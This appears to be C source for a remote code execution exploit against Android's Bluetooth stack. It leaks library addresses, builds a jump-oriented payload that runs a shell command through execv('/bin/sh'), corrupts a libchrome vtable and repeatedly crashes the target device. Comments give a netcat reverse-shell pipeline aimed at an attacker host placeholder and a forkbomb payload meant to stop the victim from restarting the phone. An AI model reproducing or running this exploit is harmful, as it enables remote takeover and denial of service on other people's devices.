#include "log.h"
#include "errors.h"
#include "bluetooth.h"
#include "leak.h"
#include "smash.h"

#include <time.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>

#include <pthread.h>
#include <unistd.h>

#include "libandroid_runtime_constants.h"

// I was initially using "toybox nc <ATTACKER_IP> <ATTACKER_PORT_1> | /bin/sh | toybox nc <ATTACKER_IP> <ATTACKER_PORT_2>", but the Pixel 3XL's rules disallow the bluetooth user from using tcp sockets
// So... You can use a forkbomb because it prevents applications from starting and prevents the user from restarting the phone lol
// #define VICTIM_COMMAND "forkbomb() { forkbomb | forkbomb & }; forkbomb"
// Or... Be a boring person and just use use a simple command that can be seen through "top -u bluetooth -d 1"
#define VICTIM_COMMAND "bluetooth_pwned() { sleep 1; bluetooth_pwned & }; bluetooth_pwned"
// #define VICTIM_COMMAND "sleep 7d"

#define REPEAT_COUNT ((size_t)7)
#define REST_SECONDS (5)

#define PAYLOAD_CHUNK_SIZE ((size_t)512)

struct payload_generator_data
{
    // In
    char *command;
    uint64_t libandroid_runtime_base;

    // Out
    uint64_t payload_address;
};

err_t payload_generator_callback(uint64_t payload_address, uint8_t *payload_data, size_t payload_data_size, void *priv)
{
    struct payload_generator_data *data = (struct payload_generator_data *)priv;
    const size_t payload_jop_size = 0x78;

    LOGL_INFO("Generating payload...\n")

    if (data->command == NULL)
        ERR_RET("NULL_COMMAND", "Parameter command cannot be NULL");
    if (data->libandroid_runtime_base == 0)
        ERR_RET("NULL_LIBANDROID_RUNTIME_BASE", "Parameter libandroid_runtime_base cannot be NULL");

    LOGL_DBG_INFO("Payload address: 0x%016" PRIx64 "\n", payload_address);
    LOGL_DBG_INFO("Payload maximum size: %zu\n", payload_data_size);

    if (payload_data_size < payload_jop_size)
        ERR_RET("PAYLOAD_TOO_SMALL", "Payload is too small and cannot fit the JOP chain");

    size_t command_max_size = payload_data_size - payload_jop_size;
    LOGL_DBG_INFO("Command maximum size: %zu\n", payload_data_size);
    if (strlen(data->command) + 1 > command_max_size)
        ERR_RET("COMMAND_TOO_BIG", "Command is too big and cannot fit in the payload");

    LOGL_DBG_INFO("Command: %s\n", ((struct payload_generator_data *)priv)->command);

    uint64_t *payload_data_64 = (uint64_t *)payload_data;

    /* 0x00 */ payload_data_64[0] = payload_address + 0x8;
    /* 0x08 */ payload_data_64[1] = data->libandroid_runtime_base + LIBANDROID_RUNTIME_GADGET_X0_X21_SYNC_ADDRESS;
    /* 0x10 */ payload_data_64[2] = data->libandroid_runtime_base + LIBANDROID_RUNTIME_EXECV_ADDRESS;
    /* 0x18 */ payload_data_64[3] = 0;
    /* 0x20 */ payload_data_64[4] = payload_address + 0x58;
    /* 0x28 */ payload_data_64[5] = data->libandroid_runtime_base + LIBANDROID_RUNTIME_GADGET_X0_X21_ADDER_ADDRESS;
    /* 0x30 */ payload_data_64[6] = 0;
    /* 0x38 */ payload_data_64[7] = data->libandroid_runtime_base + LIBANDROID_RUNTIME_GADGET_CALLER_ADDRESS;
    /* 0x40 */ memcpy(payload_data_64 + 8, "/bin/sh\0", 8);
    /* 0x48 */ memcpy(payload_data_64 + 9, "-c\0\0\0\0\0\0", 8);
    /* 0x50 */ payload_data_64[10] = 0;
    /* 0x58 */ payload_data_64[11] = payload_address + 0x40;
    /* 0x60 */ payload_data_64[12] = payload_address + 0x48;
    /* 0x68 */ payload_data_64[13] = payload_address + 0x78;
    /* 0x70 */ payload_data_64[14] = 0;
    /* 0x78 */ memcpy(payload_data_64 + 15, data->command, strlen(data->command) + 1);

    data->payload_address = payload_address;

    return NULL;
}

err_t exploit(const char *bdaddr_str)
{
    LOGL_INFO("Exploit started...\n")

    // Create both sockets
    // int hci_sock_fd, l2cap_sock_fd;
    // int hci_sock_fd;
    // uint16_t hci_handle;
    uint8_t packet_id = 42;

    bdaddr_t bdaddr;
    ERR_FWD(bluetooth_str_to_bdaddr(bdaddr_str, &bdaddr));

    /////////////////////////////////////
    // Leak libandroid runtime address //
    /////////////////////////////////////
    uint64_t libandroid_runtime_base = 0;
    for (size_t i = 0; i < REPEAT_COUNT; i++)
    {
        LOGL_DBG_INFO("Crashing target...\n")
        ERR_FWD(smash_crash_target(bdaddr, &packet_id));

        LOGL_INFO("Leaking libandroid runtime address, attempt %zu\n", i + 1);
        err_t err = leak_libandroid_runtime_base(bdaddr, &packet_id, &libandroid_runtime_base);
        if (err)
        {
            LOGL_ERROR("Could not leak libandroid runtime address: \n")
            err_print_free(err);
            continue;
        }

        break;
    }

    if (!libandroid_runtime_base)
        ERR_RET("LEAK_LIBANDROID_RUNTIME_BASE", "Could not leak libandroid runtime address");

    LOGL_SUCCESS("Leaked libandroid runtime address: 0x%016" PRIx64 "\n", libandroid_runtime_base)

    uint64_t caller_gadget_address = libandroid_runtime_base + LIBANDROID_RUNTIME_GADGET_CALLER_ADDRESS;
    uint64_t adder_gadget_address = libandroid_runtime_base + LIBANDROID_RUNTIME_GADGET_X0_X21_ADDER_ADDRESS;
    uint64_t sync_gadget_address = libandroid_runtime_base + LIBANDROID_RUNTIME_GADGET_X0_X21_SYNC_ADDRESS;
    uint64_t execv_address = libandroid_runtime_base + LIBANDROID_RUNTIME_EXECV_ADDRESS;

    LOGL_INFO("Caller gadget address: 0x%016" PRIx64 "\n", caller_gadget_address)
    LOGL_INFO("Adder gadget address: 0x%016" PRIx64 "\n", adder_gadget_address)
    LOGL_INFO("Sync gadget address: 0x%016" PRIx64 "\n", sync_gadget_address)
    LOGL_INFO("Execv address: 0x%016" PRIx64 "\n", execv_address)

    for (size_t i = 0; i < REPEAT_COUNT; i++) // We do not have a way of verifying if we succeeded (yet), so we just repeat a few times (for now)
    {
        LOGL_INFO("RCE attempt %zu/%zu\n", i + 1, REPEAT_COUNT);

        ////////////////////////////////////////
        // Leak an address of controlled data //
        ////////////////////////////////////////
        char command[] = VICTIM_COMMAND;
        struct payload_generator_data payload_generator_data = {
            .command = command,
            .libandroid_runtime_base = libandroid_runtime_base,
        };

        uint64_t controlled_payload_address = 0;
        for (size_t j = 0; j < REPEAT_COUNT; j++)
        {
            LOGL_INFO("Leaking controlled payload address, attempt %zu\n", j + 1);
            err_t err = leak_controlled_payload_address(bdaddr, PAYLOAD_CHUNK_SIZE, &packet_id, payload_generator_callback, &payload_generator_data);
            if (err)
            {
                LOGL_ERROR("Could not leak controlled payload address: \n")
                err_print(err);

                if (strcmp(err_root(err)->name, "LEAK_PATTERN_NOT_FOUND") == 0)
                {
                    LOGL_WARNING("Leak pattern was not found, crashing target to improve chances...\n")
                    ERR_FWD(smash_crash_target(bdaddr, &packet_id));
                }

                err_free(err);
                continue;
            }

            break;
        }

        controlled_payload_address = payload_generator_data.payload_address;
        if (!controlled_payload_address)
            ERR_RET("LEAK_CONTROLLED_PAYLOAD_ADDRESS", "Could not leak controlled payload address");

        LOGL_SUCCESS("Leaked controlled payload address: 0x%016" PRIx64 "\n", controlled_payload_address)

        ////////////////////////////////////////////
        // Corrupt libchrome vtable to point here //
        ////////////////////////////////////////////
        getchar();
        ERR_FWD(smash_corrupt_libchrome_vtable(bdaddr, &packet_id, controlled_payload_address));

        bool retry = logl_ask_yn("Do you want to retry?", false);
        if (!retry)
            break;
        if (i + 1 < REPEAT_COUNT)
        {
            LOGL_DBG_INFO("Crashing target to allow for the next try...\n")
            ERR_FWD(smash_crash_target(bdaddr, &packet_id));
        }
    }

    return NULL;
}

int main(int argc, char **argv)
{
    if (argc != 2)
    {
        printf("Usage: %s <bdaddr>\n", argv[0]);
        printf("Example: %s 00:11:22:33:44:55\n", argv[0]);

        return -1;
    }

    int ret = 0;

    err_t err = exploit(argv[1]);
    if (err)
    {
        err_print_free(err);
        ret = -1;
    }

    return ret;
}
